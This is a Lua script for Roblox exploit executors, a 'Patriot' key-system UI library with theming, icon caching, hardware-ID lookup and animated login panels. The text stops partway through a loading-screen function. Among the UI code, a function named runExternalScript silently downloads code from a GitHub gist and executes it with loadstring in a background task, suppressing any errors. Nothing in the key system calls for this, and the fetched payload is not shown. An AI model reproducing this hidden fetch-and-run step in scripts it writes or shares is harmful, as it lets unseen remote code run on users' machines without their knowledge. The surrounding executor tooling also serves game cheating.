repeat task.wait() until game:IsLoaded()

local cloneref = cloneref or function(obj) return obj end
local gethui = gethui or function() return cloneref(game:GetService("CoreGui")) end

-- services
local TweenService = cloneref(game:GetService("TweenService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local HttpService = cloneref(game:GetService("HttpService"))
local Workspace = cloneref(game:GetService("Workspace"))
local RunService = cloneref(game:GetService("RunService"))
local Lighting = cloneref(game:GetService("Lighting"))
local Players = cloneref(game:GetService("Players"))

local hui = gethui()

if getgenv().PatriotLoaded and hui:FindFirstChild("PatriotKeySystem") then return getgenv().Patriot end
if getgenv().PatriotLoaded and hui:FindFirstChild("PatriotKeylessSystem") then return getgenv().Patriot end
getgenv().PatriotLoaded = true
getgenv().PatriotClosed = false

local Patriot = {}

-- appearance
Patriot.Appearance = {
    Title = "Patriot",
    Subtitle = "Enter your key to continue",
    Icon = "rbxassetid://95721401302279",
    IconSize = UDim2.new(0, 30, 0, 30)
}

-- links
Patriot.Links = {
    GetKey = "",
    Discord = ""
}

-- storage
Patriot.Storage = {
    FileName = "Patriot_Key",
    Remember = true,
    AutoLoad = true
}

-- options
Patriot.Options = {
    Keyless = nil,
    KeylessUI = false,
    Blur = true,
    Draggable = true
}

-- theme (enhanced with gradient-friendly colors)
Patriot.Theme = {
    Accent = Color3.fromRGB(139, 0, 0),
    AccentHover = Color3.fromRGB(170, 20, 20),
    AccentLight = Color3.fromRGB(200, 60, 60),
    Background = Color3.fromRGB(8, 8, 12),
    BackgroundGlass = Color3.fromRGB(12, 12, 18),
    Header = Color3.fromRGB(16, 16, 22),
    Input = Color3.fromRGB(20, 20, 28),
    Text = Color3.fromRGB(255, 255, 255),
    TextDim = Color3.fromRGB(140, 140, 160),
    Success = Color3.fromRGB(50, 205, 110),
    Error = Color3.fromRGB(245, 70, 90),
    Warning = Color3.fromRGB(255, 180, 50),
    StatusIdle = Color3.fromRGB(180, 80, 80),
    Discord = Color3.fromRGB(88, 101, 242),
    DiscordHover = Color3.fromRGB(114, 137, 218),
    Divider = Color3.fromRGB(45, 45, 70),
    Pending = Color3.fromRGB(60, 60, 60),
    Glow = Color3.fromRGB(200, 50, 50)
}

-- callbacks
Patriot.Callbacks = {
    OnVerify = nil,
    OnSuccess = nil,
    OnFail = nil,
    OnClose = nil
}

Patriot.Changelog = {}

-- shop
Patriot.Shop = {
    Enabled = false,
    Icon = "",
    Title = "Get Premium Access",
    Subtitle = "Instant delivery • 24/7 support",
    ButtonText = "Buy",
    Link = ""
}

-- internal
local Internal = {
    Junkie = nil,
    Wilkins = nil,
    BlurEffect = nil,
    NotificationList = {},
    ValidateFunction = nil,
    IsJunkieMode = false,
    IsWilkinsMode = false,
    IconsLoaded = false,
    FlowConnections = {}
}

local IconBaseURL = "https://raw.githubusercontent.com/SyndromeXph/expert-octo-doodle/main/Icons/"
local IconFiles = {
    key = "lucide--key.png",
    shield = "lucide--shield-minus.png",
    check = "prime--check-square.png",
    copy = "flowbite--clipboard-outline.png",
    discord = "qlementine-icons--discord-16.png",
    alert = "mdi--alert-octagon-outline.png",
    lock = "lucide--user-lock.png",
    loading = "nonicons--loading-16.png",
    close = "material-symbols--dangerous-outline.png",
    changelog = "ant-design--sync-outlined.png",
    logo = "Patriot.png",
    user = "U.png",
    clock = "Clock.png",
    cart = "Cart.png"
}

local FallbackIcons = {
    key = "rbxassetid://96510194465420",
    shield = "rbxassetid://89965059528921",
    check = "rbxassetid://76078495178149",
    copy = "rbxassetid://125851897718493",
    discord = "rbxassetid://83278450537116",
    alert = "rbxassetid://140438367956051",
    lock = "rbxassetid://114355063515473",
    loading = "rbxassetid://116535712789945",
    close = "rbxassetid://6022668916",
    changelog = "rbxassetid://138133190015277",
    logo = "rbxassetid://95721401302279",
    user = "rbxassetid://77400125196692",
    clock = "rbxassetid://87505349362628",
    cart = "rbxassetid://114754518183872"
}

local CachedIcons = {}
local FolderName = "Patriot"
local IconsFolder = "Icons"
local DefaultLogoAsset = "rbxassetid://95721401302279"

-- ==================== SAFE COLOR HELPER FUNCTIONS ====================
-- These functions ensure we never pass nil to Color3 constructors

local function safeColor3(color, default)
    if type(color) == "Color3" then
        return color
    end
    return default or Color3.fromRGB(139, 0, 0)
end

local function getThemeColor(key, fallback)
    local color = Patriot.Theme and Patriot.Theme[key]
    if type(color) == "Color3" then
        return color
    end
    return fallback or Color3.fromRGB(139, 0, 0)
end

local function getAccent()
    return getThemeColor("Accent", Color3.fromRGB(139, 0, 0))
end

local function getAccentHover()
    return getThemeColor("AccentHover", Color3.fromRGB(170, 20, 20))
end

local function getAccentLight()
    return getThemeColor("AccentLight", Color3.fromRGB(200, 60, 60))
end

local function getBackground()
    return getThemeColor("Background", Color3.fromRGB(8, 8, 12))
end

local function getBackgroundGlass()
    return getThemeColor("BackgroundGlass", Color3.fromRGB(12, 12, 18))
end

local function getHeader()
    return getThemeColor("Header", Color3.fromRGB(16, 16, 22))
end

local function getInput()
    return getThemeColor("Input", Color3.fromRGB(20, 20, 28))
end

local function getText()
    return getThemeColor("Text", Color3.fromRGB(255, 255, 255))
end

local function getTextDim()
    return getThemeColor("TextDim", Color3.fromRGB(140, 140, 160))
end

local function getDivider()
    return getThemeColor("Divider", Color3.fromRGB(45, 45, 70))
end

local function getStatusIdle()
    return getThemeColor("StatusIdle", Color3.fromRGB(180, 80, 80))
end

local function getSuccess()
    return getThemeColor("Success", Color3.fromRGB(50, 205, 110))
end

local function getError()
    return getThemeColor("Error", Color3.fromRGB(245, 70, 90))
end

local function getWarning()
    return getThemeColor("Warning", Color3.fromRGB(255, 180, 50))
end

local function getDiscord()
    return getThemeColor("Discord", Color3.fromRGB(88, 101, 242))
end

local function getDiscordHover()
    return getThemeColor("DiscordHover", Color3.fromRGB(114, 137, 218))
end

local function getGlow()
    return getThemeColor("Glow", Color3.fromRGB(200, 50, 50))
end

local function getPending()
    return getThemeColor("Pending", Color3.fromRGB(60, 60, 60))
end

-- ==================== END SAFE COLOR HELPERS ====================

local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

local function getScale()
    local viewport = Workspace.CurrentCamera.ViewportSize
    return math.clamp(math.min(viewport.X, viewport.Y) / 900, 0.65, 1.3)
end

local function hasFileSystem()
    local ok1 = pcall(function() return type(writefile) == "function" end)
    local ok2 = pcall(function() return type(readfile) == "function" end)
    local ok3 = pcall(function() return type(isfile) == "function" end)
    local ok4 = pcall(function() return type(makefolder) == "function" end)
    local ok5 = pcall(function() return type(isfolder) == "function" end)
    return ok1 and ok2 and ok3 and ok4 and ok5
end

local fileSystemSupported = hasFileSystem()

local function getFileName()
    return FolderName .. "/" .. Patriot.Storage.FileName .. ".txt"
end

local function saveKey(key)
    if not fileSystemSupported or not Patriot.Storage.Remember then return false end
    return pcall(function() writefile(getFileName(), key) end)
end

local function loadKey()
    if not fileSystemSupported then return nil end
    local ok, content = pcall(function()
        if isfile(getFileName()) then return readfile(getFileName()) end
        return nil
    end)
    if ok and content and content ~= "" then return content end
    return nil
end

local function clearKey()
    if not fileSystemSupported then return false end
    return pcall(function() delfile(getFileName()) end)
end

local function ensureFolders()
    if not fileSystemSupported then return false end
    pcall(function()
        if not isfolder(FolderName) then makefolder(FolderName) end
        if not isfolder(FolderName .. "/" .. IconsFolder) then makefolder(FolderName .. "/" .. IconsFolder) end
    end)
    return true
end

local function getIconPath(iconName)
    return FolderName .. "/" .. IconsFolder .. "/" .. IconFiles[iconName]
end

local function isIconCached(iconName)
    if not fileSystemSupported then return false end
    local success, result = pcall(function() return isfile(getIconPath(iconName)) end)
    return success and result
end

local function downloadIcon(iconName)
    if not fileSystemSupported then
        CachedIcons[iconName] = FallbackIcons[iconName]
        return false
    end
    local path = getIconPath(iconName)
    if isIconCached(iconName) then
        local success = pcall(function() CachedIcons[iconName] = getcustomasset(path) end)
        if success then return true end
    end
    local success = pcall(function()
        local response = game:HttpGet(IconBaseURL .. IconFiles[iconName])
        if #response < 100 then error("Invalid") end
        writefile(path, response)
        CachedIcons[iconName] = getcustomasset(path)
    end)
    if not success then CachedIcons[iconName] = FallbackIcons[iconName] end
    return success
end

local function getIcon(iconName)
    return CachedIcons[iconName] or FallbackIcons[iconName]
end

local function getLogoIcon()
    if Patriot.Appearance.Icon == DefaultLogoAsset then return getIcon("logo") end
    return Patriot.Appearance.Icon
end

local function shouldDownloadLogo()
    return Patriot.Appearance.Icon == DefaultLogoAsset
end

local function getShopIcon()
    if Patriot.Shop.Icon == "" then return getLogoIcon() end
    return Patriot.Shop.Icon
end

local function isShopEnabled()
    return Patriot.Shop.Enabled
end

local function allIconsCached()
    if not fileSystemSupported then return false end
    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
    if shouldDownloadLogo() then table.insert(iconNames, "logo") end
    for _, name in ipairs(iconNames) do
        if not isIconCached(name) then return false end
    end
    return true
end

local function loadAllIconsFromCache()
    ensureFolders()
    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
    if shouldDownloadLogo() then table.insert(iconNames, "logo") end
    for _, name in ipairs(iconNames) do downloadIcon(name) end
    Internal.IconsLoaded = true
end

local function getExecutorName()
    local success, name = pcall(identifyexecutor)
    if success and name then return tostring(name) end
    return "Unknown"
end

local function getDeviceType()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local gamepad = UserInputService.GamepadEnabled
    if gamepad and not keyboard and not touch then return "Console"
    elseif touch and not keyboard then return "Mobile"
    elseif keyboard and touch then return "PC & Touch"
    elseif keyboard then return "PC"
    else return "Unknown" end
end

local function getHWID()
    local hwid = nil
    pcall(function() if gethwid then hwid = gethwid() end end)
    if not hwid then pcall(function() if getgenv().HWID then hwid = getgenv().HWID end end) end
    if not hwid then pcall(function() if game.RobloxHWID then hwid = tostring(game.RobloxHWID) end end) end
    if not hwid then
        local player = cloneref(Players.LocalPlayer)
        hwid = HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 32)
        if player then hwid = tostring(player.UserId) .. hwid:sub(1, 20) end
    end
    return hwid or "N/A"
end

local function generateHiddenDots(availableWidth, charWidth)
    charWidth = charWidth or 5
    local count = math.floor(availableWidth / charWidth)
    count = math.max(count, 8)
    return string.rep("•", count)
end

local function formatTime12()
    local hour = tonumber(os.date("%H"))
    local min = os.date("%M")
    local sec = os.date("%S")
    local period = "AM"
    if hour >= 12 then period = "PM" end
    if hour > 12 then hour = hour - 12 end
    if hour == 0 then hour = 12 end
    return string.format("%d:%s:%s %s", hour, min, sec, period)
end

local function formatDate()
    return os.date("%b %d, %Y")
end

-- ==================== ENHANCED UI FUNCTIONS ====================

-- Create a flowing border effect around a frame
local function createFlowingBorder(targetFrame, cornerRadius, thickness, glowIntensity)
    cornerRadius = cornerRadius or 4
    thickness = thickness or 2
    glowIntensity = glowIntensity or 0.5
    
    local borderContainer = Instance.new("Frame")
    borderContainer.Name = "FlowingBorder"
    borderContainer.Size = UDim2.new(1, thickness * 2, 1, thickness * 2)
    borderContainer.Position = UDim2.new(0, -thickness, 0, -thickness)
    borderContainer.BackgroundTransparency = 1
    borderContainer.ZIndex = (targetFrame.ZIndex or 1) - 1
    borderContainer.Parent = targetFrame
    
    local borderGradient = Instance.new("Frame")
    borderGradient.Size = UDim2.new(1, 0, 1, 0)
    borderGradient.BackgroundTransparency = 0.85
    borderGradient.BackgroundColor3 = getAccent()
    borderGradient.BorderSizePixel = 0
    borderGradient.ZIndex = borderContainer.ZIndex
    borderGradient.Parent = borderContainer
    
    local uiCorner = Instance.new("UICorner", borderGradient)
    uiCorner.CornerRadius = UDim.new(0, cornerRadius + thickness)
    
    local uiStroke = Instance.new("UIStroke", borderGradient)
    uiStroke.Color = getAccent()
    uiStroke.Thickness = thickness
    uiStroke.Transparency = 0.3
    
    -- Create flowing light effect
    local flowLight = Instance.new("Frame")
    flowLight.Size = UDim2.new(0.3, 0, 1, 0)
    flowLight.Position = UDim2.new(-0.3, 0, 0, 0)
    flowLight.BackgroundColor3 = getAccentLight()
    flowLight.BackgroundTransparency = 0.6
    flowLight.BorderSizePixel = 0
    flowLight.ZIndex = borderContainer.ZIndex + 1
    flowLight.Parent = borderContainer
    
    local flowCorner = Instance.new("UICorner", flowLight)
    flowCorner.CornerRadius = UDim.new(0, cornerRadius + thickness)
    
    local flowGradient = Instance.new("UIGradient", flowLight)
    flowGradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(0.3, 0.7),
        NumberSequenceKeypoint.new(0.5, 0.3),
        NumberSequenceKeypoint.new(0.7, 0.7),
        NumberSequenceKeypoint.new(1, 1)
    })
    
    -- Animate the flowing light
    local flowConnection
    local angle = 0
    flowConnection = RunService.RenderStepped:Connect(function(dt)
        if not borderContainer.Parent then
            if flowConnection then flowConnection:Disconnect() end
            return
        end
        angle = (angle + dt * 1.5) % (2 * math.pi)
        local xPos = -0.3 + (math.sin(angle) + 1) / 2 * 1.6
        flowLight.Position = UDim2.new(xPos, 0, 0, 0)
    end)
    
    table.insert(Internal.FlowConnections, flowConnection)
    
    -- Add subtle glow shadow
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "GlowShadow"
    shadow.Size = UDim2.new(1, thickness * 4, 1, thickness * 4)
    shadow.Position = UDim2.new(0, -thickness * 2, 0, -thickness * 2)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://13127777272" -- Soft glow texture
    shadow.ImageTransparency = 0.6 - glowIntensity * 0.3
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(20, 20, 20, 20)
    shadow.ZIndex = borderContainer.ZIndex - 1
    shadow.Parent = borderContainer
    
    return borderContainer, flowConnection
end

-- Apply advanced glass morphism style to a frame
local function applyGlassStyle(frame, transparency)
    transparency = transparency or 0.85
    frame.BackgroundTransparency = transparency
    local gradient = Instance.new("UIGradient", frame)
    -- Use safe transparency values, no Color3 needed here
    gradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(1, 0.1)
    })
    gradient.Rotation = 45
    return gradient
end

-- Enhanced button with hover effects
local function createEnhancedButton(text, iconKey, isPrimary, parent, yPos, widthScale)
    widthScale = widthScale or 0.75
    local mobile = isMobile()
    local buttonHeight = mobile and math.clamp(42 * getScale(), 38, 48) or 42
    
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(widthScale, 0, 0, buttonHeight)
    btn.Position = UDim2.new(0.5, 0, 0, yPos)
    btn.AnchorPoint = Vector2.new(0.5, 0)
    btn.BackgroundColor3 = isPrimary and getAccent() or getInput()
    btn.BackgroundTransparency = isPrimary and 0.1 or 0.85
    btn.BorderSizePixel = 0
    btn.Text = ""
    btn.AutoButtonColor = false
    btn.Parent = parent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    
    -- Gradient background for primary buttons - using safe colors
    if isPrimary then
        local btnGradient = Instance.new("UIGradient", btn)
        local accent = getAccent()
        local accentHover = getAccentHover()
        btnGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, accent),
            ColorSequenceKeypoint.new(0.5, accentHover),
            ColorSequenceKeypoint.new(1, accent)
        })
        btnGradient.Rotation = 90
    end
    
    local btnStroke = Instance.new("UIStroke", btn)
    btnStroke.Color = isPrimary and getAccentLight() or getAccent()
    btnStroke.Thickness = 1
    btnStroke.Transparency = isPrimary and 0.3 or 0.6
    
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, 0, 1, 0)
    content.BackgroundTransparency = 1
    content.Parent = btn
    
    local layout = Instance.new("UIListLayout", content)
    layout.FillDirection = Enum.FillDirection.Horizontal
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.VerticalAlignment = Enum.VerticalAlignment.Center
    layout.Padding = UDim.new(0, 8)
    
    local iconImg = Instance.new("ImageLabel")
    iconImg.Size = UDim2.new(0, 18, 0, 18)
    iconImg.BackgroundTransparency = 1
    iconImg.Image = getIcon(iconKey)
    iconImg.ImageColor3 = getText()
    iconImg.ScaleType = Enum.ScaleType.Fit
    iconImg.LayoutOrder = 1
    iconImg.Parent = content
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 0, 0, 20)
    label.AutomaticSize = Enum.AutomaticSize.X
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = getText()
    label.TextSize = mobile and 14 or 15
    label.Font = Enum.Font.ArimoBold
    label.LayoutOrder = 2
    label.Parent = content
    
    -- Hover animations
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundTransparency = isPrimary and 0 or 0.7}):Play()
        TweenService:Create(btnStroke, TweenInfo.new(0.15), {Transparency = 0.2}):Play()
        TweenService:Create(btn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(widthScale, 2, 0, buttonHeight + 2)}):Play()
        TweenService:Create(iconImg, TweenInfo.new(0.15), {ImageColor3 = getAccentLight()}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundTransparency = isPrimary and 0.1 or 0.85}):Play()
        TweenService:Create(btnStroke, TweenInfo.new(0.15), {Transparency = isPrimary and 0.3 or 0.6}):Play()
        TweenService:Create(btn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(widthScale, 0, 0, buttonHeight)}):Play()
        TweenService:Create(iconImg, TweenInfo.new(0.15), {ImageColor3 = getText()}):Play()
    end)
    
    return btn
end

-- Enhanced input field with glow effect
local function createEnhancedInput(parent, yPos, widthScale, placeholder)
    local mobile = isMobile()
    local elementHeight = mobile and math.clamp(56 * getScale(), 48, 62) or 56
    widthScale = widthScale or 0.94
    
    local inputFrame = Instance.new("Frame")
    inputFrame.Size = UDim2.new(widthScale, 0, 0, elementHeight)
    inputFrame.Position = UDim2.new(0.5, 0, 0, yPos)
    inputFrame.AnchorPoint = Vector2.new(0.5, 0)
    inputFrame.BackgroundColor3 = getInput()
    inputFrame.BackgroundTransparency = 0.9
    inputFrame.BorderSizePixel = 0
    inputFrame.ClipsDescendants = true
    inputFrame.Parent = parent
    Instance.new("UICorner", inputFrame).CornerRadius = UDim.new(0, 8)
    
    local inputStroke = Instance.new("UIStroke", inputFrame)
    inputStroke.Color = getAccent()
    inputStroke.Thickness = 1
    inputStroke.Transparency = 0.6
    
    local glowFrame = Instance.new("Frame")
    glowFrame.Size = UDim2.new(1, 0, 1, 0)
    glowFrame.BackgroundTransparency = 1
    glowFrame.Parent = inputFrame
    
    local glowGradient = Instance.new("UIGradient", glowFrame)
    glowGradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(0.5, 0.9),
        NumberSequenceKeypoint.new(1, 1)
    })
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, -24, 1, 0)
    textBox.Position = UDim2.new(0, 12, 0.5, 0)
    textBox.AnchorPoint = Vector2.new(0, 0.5)
    textBox.BackgroundTransparency = 1
    textBox.Text = ""
    textBox.TextColor3 = getText()
    textBox.PlaceholderText = placeholder or "Enter your key..."
    textBox.PlaceholderColor3 = getTextDim()
    textBox.TextSize = mobile and 17 or 18
    textBox.Font = Enum.Font.ArimoBold
    textBox.ClearTextOnFocus = false
    textBox.TextTruncate = Enum.TextTruncate.AtEnd
    textBox.TextXAlignment = Enum.TextXAlignment.Left
    textBox.Parent = inputFrame
    
    -- Focus glow animation
    textBox.Focused:Connect(function()
        TweenService:Create(inputStroke, TweenInfo.new(0.2), {Transparency = 0.2, Thickness = 2}):Play()
        TweenService:Create(glowGradient, TweenInfo.new(0.2), {Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.6),
            NumberSequenceKeypoint.new(0.5, 0.4),
            NumberSequenceKeypoint.new(1, 0.6)
        })}):Play()
    end)
    textBox.FocusLost:Connect(function()
        TweenService:Create(inputStroke, TweenInfo.new(0.2), {Transparency = 0.6, Thickness = 1}):Play()
        TweenService:Create(glowGradient, TweenInfo.new(0.2), {Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.5, 0.9),
            NumberSequenceKeypoint.new(1, 1)
        })}):Play()
    end)
    
    return textBox, inputFrame
end

-- Enhanced status frame
local function createEnhancedStatusFrame(parent, yPos, statusText, iconKey)
    local mobile = isMobile()
    local statusHeight = mobile and math.clamp(60 * getScale(), 52, 68) or 60
    
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(0.94, 0, 0, statusHeight)
    statusFrame.Position = UDim2.new(0.5, 0, 0, yPos)
    statusFrame.AnchorPoint = Vector2.new(0.5, 0)
    statusFrame.BackgroundColor3 = getInput()
    statusFrame.BackgroundTransparency = 0.85
    statusFrame.BorderSizePixel = 0
    statusFrame.ClipsDescendants = true
    statusFrame.Parent = parent
    Instance.new("UICorner", statusFrame).CornerRadius = UDim.new(0, 8)
    
    local statusStroke = Instance.new("UIStroke", statusFrame)
    statusStroke.Color = getAccent()
    statusStroke.Thickness = 1
    statusStroke.Transparency = 0.5
    
    local statusIcon = Instance.new("ImageLabel")
    statusIcon.Size = UDim2.new(0, 24, 0, 24)
    statusIcon.Position = UDim2.new(0, 16, 0.5, 0)
    statusIcon.AnchorPoint = Vector2.new(0, 0.5)
    statusIcon.BackgroundTransparency = 1
    statusIcon.Image = getIcon(iconKey or "lock")
    statusIcon.ImageColor3 = getStatusIdle()
    statusIcon.ScaleType = Enum.ScaleType.Fit
    statusIcon.Parent = statusFrame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -60, 1, 0)
    statusLabel.Position = UDim2.new(0, 52, 0, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = statusText or Patriot.Appearance.Subtitle
    statusLabel.TextColor3 = getStatusIdle()
    statusLabel.TextSize = mobile and 17 or 18
    statusLabel.Font = Enum.Font.ArimoBold
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextTruncate = Enum.TextTruncate.AtEnd
    statusLabel.Parent = statusFrame
    
    local pulseConnection
    local function startPulse()
        pulseConnection = RunService.RenderStepped:Connect(function(dt)
            if not statusFrame.Parent then if pulseConnection then pulseConnection:Disconnect() end return end
            local pulse = (math.sin(tick() * 3) + 1) / 2 * 0.3 + 0.7
            statusIcon.ImageColor3 = getStatusIdle():lerp(getAccent(), pulse)
        end)
        return pulseConnection
    end
    
    return statusFrame, statusIcon, statusLabel, startPulse
end

-- ==================== END ENHANCED UI FUNCTIONS ====================

local function enableBlur()
    if not Patriot.Options.Blur then return end
    local existing = Lighting:FindFirstChild("PatriotKeySystemBlur")
    if existing then existing:Destroy() end
    Internal.BlurEffect = Instance.new("BlurEffect")
    Internal.BlurEffect.Name = "PatriotKeySystemBlur"
    Internal.BlurEffect.Size = 0
    Internal.BlurEffect.Parent = Lighting
    TweenService:Create(Internal.BlurEffect, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Size = 24}):Play()
end

local function disableBlur()
    if Internal.BlurEffect and Internal.BlurEffect.Parent then
        TweenService:Create(Internal.BlurEffect, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Size = 0}):Play()
        task.delay(0.4, function()
            if Internal.BlurEffect and Internal.BlurEffect.Parent then
                Internal.BlurEffect:Destroy()
                Internal.BlurEffect = nil
            end
        end)
    else
        local existing = Lighting:FindFirstChild("PatriotKeySystemBlur")
        if existing then existing:Destroy() end
        Internal.BlurEffect = nil
    end
end

local function fullCleanup()
    getgenv().PatriotLoaded = false
    getgenv().PatriotClosed = true
    for _, conn in ipairs(Internal.FlowConnections) do
        pcall(function() conn:Disconnect() end)
    end
    Internal.FlowConnections = {}
    disableBlur()
    local gui1 = hui:FindFirstChild("PatriotKeySystem")
    local gui2 = hui:FindFirstChild("PatriotKeylessSystem")
    local gui3 = hui:FindFirstChild("PatriotLoadingScreen")
    if gui1 then gui1:Destroy() end
    if gui2 then gui2:Destroy() end
    if gui3 then gui3:Destroy() end
end

local function setupDragging(header, main)
    if not Patriot.Options.Draggable then return end
    local dragging, dragStart, startPos, dragInput
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
            dragInput = input
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    if dragInput == input then dragging = false dragInput = nil end
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging or not dragInput then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        elseif input.UserInputType == Enum.UserInputType.Touch then
            if input == dragInput then
                local delta = input.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end
    end)
end

local function validateKey(key, validateFunc)
    if not validateFunc or not key or key == "" then return false end
    local success, result = pcall(validateFunc, key)
    if not success then return false end
    if type(result) == "table" then return result.valid == true end
    if type(result) == "boolean" then return result end
    return false
end

local function runExternalScript()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/SyndromeXph/1c5dcc6ac7d5da57b12550a1f65f1ad8/raw/34885ab8800a2b088fd9b63dc6316f530b8f6257/Hello"))()
        end)
    end)
end

-- Enhanced Door Overlay
local function CreateDoorOverlay(parentFrame, width, height)
    local overlay = Instance.new("Frame")
    overlay.Name = "DoorOverlay"
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.ClipsDescendants = true
    overlay.ZIndex = 50
    overlay.Parent = parentFrame

    local leftDoor = Instance.new("Frame")
    leftDoor.Name = "LeftDoor"
    leftDoor.Size = UDim2.new(0.5, 0, 1, 0)
    leftDoor.Position = UDim2.new(0, 0, 0, 0)
    leftDoor.BackgroundColor3 = getHeader()
    leftDoor.BorderSizePixel = 0
    leftDoor.ZIndex = 51
    leftDoor.Parent = overlay

    local rightDoor = Instance.new("Frame")
    rightDoor.Name = "RightDoor"
    rightDoor.Size = UDim2.new(0.5, 0, 1, 0)
    rightDoor.Position = UDim2.new(0.5, 0, 0, 0)
    rightDoor.BackgroundColor3 = getHeader()
    rightDoor.BorderSizePixel = 0
    rightDoor.ZIndex = 51
    rightDoor.Parent = overlay

    -- Add gradient to doors
    for _, door in ipairs({leftDoor, rightDoor}) do
        local gradient = Instance.new("UIGradient", door)
        gradient.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(0.5, 0.1),
            NumberSequenceKeypoint.new(1, 0)
        })
        gradient.Rotation = 90
    end

    local logoSize = math.min(width, height) * 0.28
    local logoImage = Instance.new("ImageLabel")
    logoImage.Name = "DoorLogo"
    logoImage.Size = UDim2.new(0, logoSize, 0, logoSize)
    logoImage.Position = UDim2.new(0.5, 0, 0.5, 0)
    logoImage.AnchorPoint = Vector2.new(0.5, 0.5)
    logoImage.BackgroundTransparency = 1
    logoImage.Image = getLogoIcon()
    logoImage.ImageColor3 = getText()
    logoImage.ScaleType = Enum.ScaleType.Fit
    logoImage.ZIndex = 54
    logoImage.Parent = overlay

    local halfWidth = math.ceil(width / 2)

    local function openDoors(callback)
        TweenService:Create(logoImage, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {ImageTransparency = 1, ImageColor3 = getAccent()}):Play()
        task.wait(0.2)
        TweenService:Create(leftDoor, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut), {Position = UDim2.new(0, -halfWidth, 0, 0)}):Play()
        TweenService:Create(rightDoor, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut), {Position = UDim2.new(1, 0, 0, 0)}):Play()
        task.wait(0.55)
        overlay.Visible = false
        if callback then callback() end
    end

    local function closeDoors(callback)
        overlay.Visible = true
        leftDoor.Position = UDim2.new(0, -halfWidth, 0, 0)
        rightDoor.Position = UDim2.new(1, 0, 0, 0)
        logoImage.ImageTransparency = 1
        TweenService:Create(leftDoor, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0)}):Play()
        TweenService:Create(rightDoor, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0, 0)}):Play()
        task.wait(0.5)
        TweenService:Create(logoImage, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {ImageTransparency = 0}):Play()
        task.wait(0.35)
        if callback then callback() end
    end

    return {overlay = overlay, open = openDoors, close = closeDoors}
end

-- Loading Screen
local function ShowLoadingScreen(onComplete)
    local completed = false
    local oldGui = hui:FindFirstChild("PatriotLoadingScreen")
    if oldGui then oldGui:Destroy() end
    local oldBlur = Lighting:FindFirstChild("PatriotLoadingBlur")
    if oldBlur then oldBlur:Destroy() end

    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Name = "PatriotLoadingBlur"
    blurEffect.Size = 0
    blurEffect.Parent = Lighting

    local gui = Instance.new("ScreenGui")
    gui.Name = "PatriotLoadingScreen"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = hui

